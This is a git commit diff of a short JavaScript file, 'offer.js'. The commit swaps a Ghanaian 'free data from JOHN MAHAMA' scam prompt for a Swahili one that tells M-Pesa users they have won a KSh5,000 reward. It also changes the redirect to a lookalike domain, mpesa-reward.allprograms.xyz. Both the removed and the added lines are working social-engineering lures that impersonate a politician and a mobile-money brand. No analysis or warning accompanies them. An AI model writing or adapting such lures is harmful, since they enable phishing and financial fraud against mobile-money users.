1247180842a7ded7b60c27a1959099fbd04c4daf
uptomars <Kenoly555+me@gmail.com>
2025-07-24 04:03:40 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'KSh5,000'
+password=prompt('SMS: Hongera Akaunti yako ya Mpesa imetimiza masharti ya kupokea zawadi ya KSh5,000 ya Kuadhimisha Mwaka wa MoMo, Tafadhali Bonyeza SAWA ILI KUENDELEA ','KSh5,000');
+if (password != 'KSh5,000') {
+location.href='https://mpesa-reward.allprograms.xyz/gift';
 }
